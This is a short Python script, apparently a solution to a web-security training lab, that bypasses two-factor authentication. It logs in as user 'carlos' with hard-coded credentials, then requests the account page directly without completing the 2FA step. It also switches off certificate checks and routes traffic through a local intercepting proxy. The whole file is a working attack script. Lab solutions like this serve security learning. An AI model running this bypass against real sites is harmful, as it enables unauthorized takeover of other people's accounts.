import requests
import sys
import argparse
from requests.exceptions import RequestException

# Desactivar advertencias de certificados SSL no verificados
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxies (opcional)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(session, base_url):
    """
    Intenta iniciar sesión en la cuenta de Carlos y verifica el éxito del bypass de 2FA.
    """
    print("[+] Iniciando sesión en la cuenta de Carlos y omitiendo verificación 2FA")
    login_url = f"{base_url}/login"
    login_data = {"username": "carlos", "password": "montoya"}

    try:
        response = session.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
        if response.status_code != 302:  # Cambiar según el comportamiento esperado
            print("[-] No se pudo iniciar sesión correctamente.")
            sys.exit(-1)

        # Verificar el bypass de 2FA
        myaccount_url = f"{base_url}/my-account"
        response = session.get(myaccount_url, verify=False, proxies=proxies)
        if "Log out" in response.text:
            print("[+] Se omitió con éxito la verificación 2FA.")
        else:
            print("[-] El bypass de 2FA falló.")
            sys.exit(-1)

    except RequestException as e:
        print(f"[-] Error al conectar con el sitio: {e}")
        sys.exit(-1)

def main():
    parser = argparse.ArgumentParser(description='Herramienta para probar el bypass de 2FA en la cuenta de Carlos.')
    parser.add_argument('url', help='URL base del sitio a probar. Ejemplo: http://www.ejemplo.com')
    args = parser.parse_args()

    session = requests.session()
    access_carlos_account(session, args.url)

if __name__ == "__main__":
    main()
